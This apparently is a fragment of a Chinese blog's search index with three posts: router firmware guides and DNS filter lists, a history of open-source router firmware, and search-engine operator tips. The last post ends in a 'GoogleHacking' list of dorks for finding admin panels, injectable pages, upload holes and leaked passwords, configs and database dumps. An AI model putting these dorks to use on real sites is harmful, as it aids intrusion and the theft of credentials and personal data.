  </entry>
  <entry>
    <title>路由器固件</title>
    <url>/posts/747a95c0/</url>
    <content><![CDATA[<h1 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h1><p>Openwrt/LEDE更加适合需要自己定制系统的人，更加偏向于类似linux系统界面操作</p>
<p>padavan使用别人封装好了的系统更方便，更加适用于脚本操作,padavan 可通过 <a href="http://my.router">http://my.router</a> 访问管理</p>
<a id="more"></a>
<p>高通系：OpenWrt &gt; Padavan &gt; DD-Wrt博通系：DD-Wrt &gt; OpenWrt &gt; Padavan高通/博通 并不是指路由器一定是这两个厂商的硬件方案。而是以高通开源和博通专利闭源两种典型的情况作为区分。在驱动开源的情况下，OpenWrt 几乎在任何时候都是最好的。DD 有博通专利驱动的使用权，非 OEM 高版本内核仍然能发挥所有的路由器功能。是闭源硬件方案的首选。Padavan 处在比较边缘的境地，能用 OP 不会选择它，不能用 OP 也不会选择它。适合老实人。</p>
<p><a href="http://openwrt.ink:8666/">固件下载</a></p>
<p><a href="http://openwrt.ink:88/archives/rm2100-shuaji">红米AC2100官方固件/OpenWrt/Padavan间互刷</a></p>
<p><a href="http://openwrt.ink:88/archives/mirouter-xiufu">红米&amp;小米AC2100刷回官方固件方法及相关工具</a></p>
<p><a href="http://openwrt.ink:88/archives/s-breed">红米AC2100一键SSH刷Breed和任意固件教程</a></p>
<p><a href="https://www.blumia.net/2020/08/02/RM2100-breed-openwrt-padavan.html">红米路由器 AC2100 刷入 Breed + OpenWrt / Padavan 过程记录</a></p>
<p><a href="https://openwrt.org/toh/xiaomi/xiaomi_redmi_router_ac2100">OpenWrt 官网上的 Xiaomi Redmi Router AC2100 硬件信息页面</a>（包含固件链接，步骤等内容）</p>
<p><a href="https://github.com/impulse/ac2100-openwrt-guide">适用于小米路由器 AC2100（而不是红米路由器）的教程帖</a>（步骤是一样的，仅参考步骤即可）</p>
<p><a href="https://4pda.ru/forum/index.php?showtopic=975687&amp;st=1580#entry96288010">老毛子的教程帖</a>（上面的看过了的话这个其实没有太大必要看，可以翻译成英语看）</p>
<p><a href="https://opt.cn2qq.com/padavan/">hiboy的Padavan固件下载</a>（<code>R2100...</code>,<code>RM2100...</code>）</p>
<p><a href="https://github.com/openwrt/openwrt/pull/2954">OpenWrt 支持 Redmi AC2100 的初始提交</a>（感谢做出贡献的人）</p>
<p><a href="https://www.right.com.cn/forum/thread-4019555-1-1.html">AC2100(RM2100) 【0124-多功能版OpenWrt】红米&amp;小米AC2100|IPV6|酸奶|SmartDNS|多拨|猫咪，附教程</a></p>
<p><a href="https://www.right.com.cn/forum/thread-4059522-1-1.html">AC2100(RM2100) 红米(小米)AC2100Breed和Padan固件教程及刷回官方教程</a></p>
<p><a href="https://www.right.com.cn/forum/thread-4039518-1-1.html">AC2100(RM2100) Padavan For 小米AC2100 乳酸菌+去广告+SmartDNS+AdGuardHome+NAT1… </a></p>
<p><a href="https://sspai.com/post/63088">AdGuard Home 安装及使用指北</a></p>
<p><a href="https://p3terx.com/archives/use-adguard-home-to-build-dns-to-prevent-pollution-and-remove-ads-2.html">使用 AdGuard Home 自建 DNS 防污染、去广告</a></p>
<p><a href="https://post.smzdm.com/p/ag82pod6/">如何正确使用smartdns搭配adguardhome， 优选dns并去除广告</a></p>
<h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p><a href="https://github.com/vernesong/OpenClash">小猫咪（OpenClash）</a></p>
<p><a href="https://github.com/xiaorouji/openwrt-passwall">帕斯沃（Passwall）</a></p>
<p><a href="https://github.com/shadowsocksrr/shadowsocksr-csharp">酸奶（酸酸乳,ShadowsocksR）</a></p>
<p><a href="https://github.com/pymumu/smartdns">SmartDNS（本地DNS服务器）</a></p>
<p><a href="https://world.crisp.help/zh/">帮助中心</a></p>
<h1 id="DNS-服务器推荐"><a href="#DNS-服务器推荐" class="headerlink" title="DNS 服务器推荐"></a>DNS 服务器推荐</h1><p>不同地区连接至 DNS 服务器的速度各有差异，各位可以通过 Ping 测速的方式寻找当地连接延迟最低的 DNS 服务器。更多 DNS 服务器可以在 <a href="https://kb.adguard.com/zh/general/dns-providers">AdGuard 文档</a>中找到。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>DNS 提供商</th>
<th>类别</th>
<th>地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>阿里</td>
<td>IPv4 DNS</td>
<td>223.5.5.5</td>
</tr>
<tr>
<td>IPv6 DNS</td>
<td>2400:3200:baba::1</td>
<td></td>
</tr>
<tr>
<td>DNS-over-Https</td>
<td><a href="https://dns.alidns.com/dns-query">https://dns.alidns.com/dns-query</a></td>
<td></td>
</tr>
<tr>
<td>DNSPod</td>
<td>IPv4 DNS</td>
<td>119.29.29.29</td>
</tr>
<tr>
<td>DNS-over-Https</td>
<td><a href="https://doh.pub/dns-query">https://doh.pub/dns-query</a></td>
<td></td>
</tr>
<tr>
<td>114</td>
<td>IPv4 DNS</td>
<td>114.114.114.114</td>
</tr>
<tr>
<td>Google</td>
<td>IPv4 DNS</td>
<td>8.8.8.8</td>
</tr>
<tr>
<td>IPv6 DNS</td>
<td>2001:4860:4860::8888</td>
<td></td>
</tr>
<tr>
<td>DNS-over-Https</td>
<td><a href="https://dns.google/dns-query">https://dns.google/dns-query</a></td>
<td></td>
</tr>
<tr>
<td>Cloudflare</td>
<td>IPv4 DNS</td>
<td>1.1.1.1</td>
</tr>
<tr>
<td>IPv6 DNS</td>
<td>2606:4700:4700::1111</td>
<td></td>
</tr>
<tr>
<td>DNS-over-Https</td>
<td><a href="https://dns.cloudflare.com/dns-query">https://dns.cloudflare.com/dns-query</a></td>
</tr>
</tbody>
</table>
</div>
<h1 id="DNS-过滤清单"><a href="#DNS-过滤清单" class="headerlink" title="DNS 过滤清单"></a>DNS 过滤清单</h1><p>为了更好地发挥 AdGuard Home 去广告的功能，仅依靠默认的过滤规则是不够的，但也不宜过多，过多的过滤规则会影响解析的速度，各位可以根据需要添加过滤规则。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>名称</th>
<th>简介</th>
<th>地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>AdGuard DNS Filter</td>
<td>AdGuard 官方维护的广告规则，涵盖多种过滤规则</td>
<td><a href="https://raw.githubusercontent.com/AdguardTeam/FiltersRegistry/master/filters/filter_15_DnsFilter/filter.txt">https://raw.githubusercontent.com/AdguardTeam/FiltersRegistry/master/filters/filter_15_DnsFilter/filter.txt</a></td>
</tr>
<tr>
<td>EasyList</td>
<td>Adblock Plus 官方维护的广告规则</td>
<td><a href="https://easylist-downloads.adblockplus.org/easylist.txt">https://easylist-downloads.adblockplus.org/easylist.txt</a></td>
</tr>
<tr>
<td>EasyList China</td>
<td>面向中文用户的 EasyList 去广告规则</td>
<td><a href="https://easylist-downloads.adblockplus.org/easylistchina.txt">https://easylist-downloads.adblockplus.org/easylistchina.txt</a></td>
</tr>
<tr>
<td>EasyPrivacy</td>
<td>反隐私跟踪、挖矿规则</td>
<td><a href="https://easylist-downloads.adblockplus.org/easyprivacy.txt">https://easylist-downloads.adblockplus.org/easyprivacy.txt</a></td>
</tr>
<tr>
<td>Halflife 规则</td>
<td>涵盖了 EasyList China、EasyList Lite、CJX ’s Annoyance、乘风视频过滤规则，以及补充的其它规则</td>
<td><a href="https://gitee.com/halflife/list/raw/master/ad.txt">https://gitee.com/halflife/list/raw/master/ad.txt</a></td>
</tr>
<tr>
<td>Xinggsf 乘风过滤</td>
<td>国内网站广告过滤规则</td>
<td><a href="https://gitee.com/xinggsf/Adblock-Rule/raw/master/rule.txt">https://gitee.com/xinggsf/Adblock-Rule/raw/master/rule.txt</a></td>
</tr>
<tr>
<td>Xinggsf 乘风视频过滤</td>
<td>视频网站广告过滤规则</td>
<td><a href="https://gitee.com/xinggsf/Adblock-Rule/raw/master/mv.txt">https://gitee.com/xinggsf/Adblock-Rule/raw/master/mv.txt</a></td>
</tr>
<tr>
<td>MalwareDomainList</td>
<td>恶意软件过滤规则</td>
<td><a href="https://www.malwaredomainlist.com/hostslist/hosts.txt">https://www.malwaredomainlist.com/hostslist/hosts.txt</a></td>
</tr>
<tr>
<td>Adblock Warning Removal List</td>
<td>去除禁止广告拦截提示规则</td>
<td><a href="https://easylist-downloads.adblockplus.org/antiadblockfilters.txt">https://easylist-downloads.adblockplus.org/antiadblockfilters.txt</a></td>
</tr>
<tr>
<td>Anti-AD</td>
<td>命中率高、兼容性强</td>
<td><a href="https://anti-ad.net/easylist.txt">https://anti-ad.net/easylist.txt</a></td>
</tr>
<tr>
<td>Fanboy’s Annoyances List</td>
<td>去除页面弹窗广告规则</td>
<td><a href="https://easylist-downloads.adblockplus.org/fanboy-annoyance.txt">https://easylist-downloads.adblockplus.org/fanboy-annoyance.txt</a></td>
</tr>
</tbody>
</table>
</div>
<p>以浏览国内网站为主的用户可以使用 anti-AD + Halflife 过滤规则，如有浏览国外网站的需要，可以根据需要添加 AdGuard DNS Filter、Fanboy’s Annoyances List 等规则。不同规则之间会存在重叠的情况，可以通过 AdGuard Home 的拦截日志分析哪些规则的使用频率最高，哪些规则拦截频率最低，再加以取舍。</p>
]]></content>
      <tags>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>路由器开源固件</title>
    <url>/posts/69b91060/</url>
    <content><![CDATA[<h1 id="新人入坑科普：OpenWRT、LEDE、潘多拉、华硕、梅林、老毛子"><a href="#新人入坑科普：OpenWRT、LEDE、潘多拉、华硕、梅林、老毛子" class="headerlink" title="新人入坑科普：OpenWRT、LEDE、潘多拉、华硕、梅林、老毛子"></a>新人入坑科普：OpenWRT、LEDE、潘多拉、华硕、梅林、老毛子</h1><p>新入坑的同学肯定有此疑问，想刷系统，不知道买哪个路由，也不知道这些系统的区别，更不知道应该选哪个。<br>说这些之前应该先提一嘴Linksys，2003年推出了WRT54G的路由。由于被发现Linksys用了很多开源代码，所以被很高的呼声要求开源。Linksys脸皮薄，于是就开源了(这一点很多国内厂家脸皮厚的很)。从此开启了路由系统发展的精彩舞台。</p>
<a id="more"></a>
<p>2004年影响这个细分领域发展历程的重要角色OpenWRT登场，OpenWRT是参考了Linksys代码的开源系统，于2005年正式推出了1.0。历经十多年的发展，截至发稿，OpenWRT的版本已经开发更新到18.06.4。我们可以把OpenWRT理解为嵌入式的 Linux 发行版，支持的品牌的型号可能是最多的，同时软件也比较多。但对博通的CPU支持的不好，主要是因为博通不开源（博通的路由常见于华硕的中高端型号）。与OpenWRT之前齐名的还在DD-WRT和Tomato，不过最近个人认为用的人没那么多了，特别是Tomato很少看到相关的技术文章。<br>官网：<a href="https://openwrt.org/">https://openwrt.org/</a></p>
<p>LEDE是OpenWRT在LEDE 17.01.0到LEDE 17.01.6的版本，这个版本固件的成熟度大幅提高，可以看作是OpenWRT的一个成熟时期。</p>
<p>潘多拉—PandoraBox，是国内lintel开发的一个基于OpenWRT的分支，更符合中国国情，早期版本对科学爱国有很好的支持，可以在openwrt.org.cn找到。18.07开始有自己的官网且版本号比Openwrt更提前。缺点支持的型号自然没有原版OpenWRT多，不过中国出售的很多机型都有支持。<br>官网：<a href="https://www.pangubox.com">https://www.pangubox.com</a></p>
<p>华硕asuswrt是自己的原厂路由系统，是华硕路由的官方固件。固件功能和稳定性很强，缺点可定制性不高。华硕大多机型都使用博通CPU，经典机型比如AC68U和AC88U。博通的特色一是性能强，二是发热量大，通常可以烤羊肉串。</p>
<p>梅林基于华硕的改版，在国内大名鼎鼎还得归功于国内很多再次改版的固件，国内改版梅林加了很多功能，早期版本对科学爱国有很好的支持。正统的梅林是基于博通CPU的，有些路由硬件配置与华硕一样，所以可以使用改版的梅林固件，经典机型就是网件（Netgear）的R7000。<br>官网：<a href="https://www.asuswrt-merlin.net/">https://www.asuswrt-merlin.net/</a></p>
<p>老毛子(Padavan)是俄罗斯人基于华硕的改版，国内出名一样归功于国内很多再次改版的固件。正统的老毛子是基于MTK方案的，有些路由硬件配置与华硕一样，所以可以使用改版的老毛子固件，斐讯的K2P就是这种情况。MTK性能比较低，但发热量也低。MT7620和MT7621成为很多国内厂商使用的解决方案。这个系列的好处是通常也可以很好的得到OpenWRT等固件的支持<br>官网：<a href="https://bitbucket.org/padavan/">https://bitbucket.org/padavan/</a></p>
<p>知道了这些特点，那么选路由就有数了。比如小白选路由，更追捧梅林或老毛子，程序员极客可能更喜欢OpenWRT。还有些奇葩CPU路由，比如高通CPU的路由。看似性价比很高，但用户太少，很多软件都要自己编译。一次两次可以当个学习娱乐，如果所有的都来可能会把人逼疯。高通CPU的路由有些奇葩型号，比如ACRH17，可以同时刷改版梅林和改版OpenWRT。</p>
<h1 id="出处"><a href="#出处" class="headerlink" title="出处"></a>出处</h1><p><a href="http://www.oshome.com/tutorial/QNA/2019-07-12/151.html">OpenWRT、LEDE、潘多拉、华硕、梅林、老毛子区别和特点是什么？</a></p>
]]></content>
      <categories>
        <category>路由器</category>
      </categories>
      <tags>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>高效搜索</title>
    <url>/posts/c92d02a8/</url>
    <content><![CDATA[<h1 id="搜索的艺术"><a href="#搜索的艺术" class="headerlink" title="搜索的艺术"></a>搜索的艺术</h1><p>  在平时使用搜索引擎的过程中，通常是将需要搜索的关键字输入搜索引擎，然后就开始了漫长的信息提取过程。其实搜索引擎对关键字提供了多种语法，合理使用这些语法，将使我们得到的搜索结果更加精确。各个搜索引擎的语法都是大致一样的，只有少部分语法不同或被禁止的。</p>
<a id="more"></a>
<h1 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h1><ul>
<li><p><strong><code>site:</code></strong>         限制搜索范围的域名</p>
</li>
<li><p><strong><code>inurl:</code></strong>         用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用</p>
</li>
<li><p><strong><code>intext:</code></strong>     只搜索网页<code>&lt;body&gt;</code>部分中包含的文字(忽略标题、URL等的文字)</p>
</li>
<li><p><strong><code>intitle:</code></strong>     查包含关键词的页面，一般用于社工别人的webshell密码</p>
</li>
<li><p><strong><code>filetype:</code></strong>     搜索文件的后缀或者扩展名</p>
</li>
<li><p><strong><code>intitle:</code></strong>     限制你搜索的网页标题</p>
</li>
<li><p><strong><code>link:</code></strong>         可以得到一个所有包含了某个指定URL的页面列表</p>
</li>
<li><p><strong><code>Site:</code></strong>         找到与指定网站有联系的URL。例如输入“Site:www.sunghost.cn”。所有和这个网站有联系的URL都会被显示</p>
</li>
<li><p><strong><code>cache:</code></strong>         搜索google里关于某些内容的缓存，有时候也许能找到一些好东西</p>
</li>
<li><p><strong><code>define:</code></strong>     搜索某个词语的定义。搜索：define：hacker，将返回关于hacker的定义</p>
</li>
<li><p><strong><code>info:</code></strong>         查找指定站点的一些基本信息</p>
</li>
</ul>
<h1 id="GoogleHacking语法"><a href="#GoogleHacking语法" class="headerlink" title="GoogleHacking语法"></a>GoogleHacking语法</h1><ul>
<li><p>查找后台地址：<code>site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</code></p>
</li>
<li><p>查找文本内容：<code>site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</code></p>
</li>
<li><p>查找可注入点：<code>site:域名 inurl:aspx|jsp|php|asp</code></p>
</li>
<li><p>查找上传漏洞：<code>site:域名 inurl:file|load|editor|Files</code></p>
</li>
<li><p>找eweb编辑器：<code>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</code></p>
</li>
<li><p>存在的数据库：<code>site:域名 filetype:mdb|asp|#</code></p>
</li>
<li><p>查看脚本类型：<code>site:域名 filetype:asp/aspx/php/jsp</code></p>
</li>
<li><p>迂回策略入侵：<code>inurl:cms/data/templates/images/index/</code></p>
</li>
<li><p>各种敏感数据收集：</p>
<ul>
<li><p><code>filetyle:xls inurl:gov username password</code></p>
</li>
<li><p><code>inurl:phpmyadmin/main.php intitle:phpmyadmin</code></p>
</li>
<li><p><code>filetype:inc inurl:config.inc host</code></p>
</li>
<li><p><code>filetype:sql cdb_members inurl:forumdata</code></p>
</li>
<li><p><code>filetype:txt inurl:&quot;新建文本文档.txt&quot;密码</code></p>
</li>
<li><p><code>inurl:phpinfo.php intitle:&quot;phpinfo()&quot;&quot;PHP Version&quot;+&quot;Server API&quot;</code></p>
</li>
<li><p><code>filetype:log inurl:log mdb</code></p>
</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>GoogleHacking</tag>
        <tag>搜索</tag>
        <tag>高效</tag>
      </tags>
  </entry>
</search>
